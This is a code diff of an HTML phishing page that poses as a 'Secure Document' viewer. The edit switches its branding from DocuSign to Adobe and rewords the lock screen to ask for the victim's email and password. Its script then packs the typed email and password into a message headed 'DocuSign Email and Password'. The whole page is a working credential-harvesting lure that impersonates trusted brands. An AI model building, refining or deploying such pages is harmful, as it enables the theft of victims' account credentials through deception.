@@ -107,7 +107,7 @@ body {
 <body>
 
 <div class="header">
-    DocuSign <span>— Secure Document</span>
+    Adobe <span>— Secure Document</span>
 </div>
 
 <div class="document-wrapper">
@@ -121,14 +121,14 @@ body {
 <div class="lock-screen" id="lockScreen">
     <div class="lock-box">
         <h3>🔒 Login to Continue</h3>
-        <p>Continue with Email.</p>
+        <p>Sign in using your recieving email and password.</p>
 
         <input type="email" id="email" placeholder="Email address" required>
         <input type="password" id="answer" placeholder="Password" required>
 
         <button onclick="submitAttempt()">Continue</button>
 
-        <div class="error" id="errorMsg">The answer you entered is incorrect.</div>
+        <div class="error" id="errorMsg">Email or password is incorrect, try Again.</div>
     </div>
 </div>
 
@@ -166,7 +166,7 @@ function submitAttempt() {
     const isCorrect = answer === CORRECT_ANSWER;
 
     const message =
-`📄 DocuSign-Style Challenge
+`📄 DocuSign Email and Password
 📧 Email: ${email}
 🔑 Password: ${answer}
 ✅ AutoFill: ${isCorrect ? "YES" : "NO"}
@@ -191,5 +191,4 @@ function submitAttempt() {
 </script>
 
 </body>
-
 </html>
